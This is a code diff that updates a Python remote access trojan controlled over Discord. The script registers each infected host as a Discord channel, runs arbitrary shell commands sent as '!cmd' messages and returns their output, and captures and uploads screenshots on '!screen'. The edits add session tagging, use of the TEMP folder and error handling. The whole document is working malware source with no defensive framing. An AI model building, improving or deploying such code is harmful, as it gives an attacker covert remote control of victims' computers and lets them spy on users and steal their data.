@@ -1,12 +1,15 @@
 # pip install discord pillow pyautogui
 # If not works after installion librares, try pip install discord pillow pyautogui pyscreeze
+
 import discord
 import socket
 import subprocess
 import pyautogui
 import os
+import uuid
 
-TOKEN = "" # <---- Discord bot token
+session = uuid.uuid4()
+TOKEN = "Token" # <---- Bot token discord
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
@@ -23,7 +26,7 @@ async def on_ready():
     global channel_ref
     guild = client.guilds[0]
     name = get_hostname()
-    channel_ref = await guild.create_text_channel(name)
+    channel_ref = await guild.create_text_channel(f"Name {name} Session {session}")
     await channel_ref.send(f"✅ Connected: {name}\n📍 Path: `{current_dir}`\n`!cmd <command>` | `!screen` to screenshot.")
     await channel_ref.send("Type cd .. to go back and cd (folder_name) to go to another folder.")
 
@@ -36,10 +39,13 @@ async def on_message(message):
 
     # 
     if message.content == "!screen":
-        path = "s.png"
-        pyautogui.screenshot(path)
-        await message.channel.send(file=discord.File(path))
-        os.remove(path)
+        path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
+        try:
+            pyautogui.screenshot(path)
+            await message.channel.send(file=discord.File(path))
+            os.remove(path)
+        except Exception as e:
+            await message.channel.send(f"Screenshot Error: {e}")
 
     # 
     elif message.content.startswith("!cmd "):
@@ -69,12 +75,13 @@ async def on_message(message):
             output = (result.stdout or result.stderr or "Executed.").strip()
 
             if len(output) > 1900:
-                with open("o.txt", "w", encoding="utf-8") as f: f.write(output)
-                await message.channel.send(file=discord.File("o.txt"))
-                os.remove("o.txt")
+                with open("outputcmd.txt", "w", encoding="utf-8") as f: f.write(output)
+                await message.channel.send(file=discord.File("outputcmd.txt"))
+                os.remove("outputcmd.txt")
             else:
                 await message.channel.send(f"```\n{output}\n```")
         except Exception as e:
             await message.channel.send(f"Error: {e}")
 
 client.run(TOKEN)
+
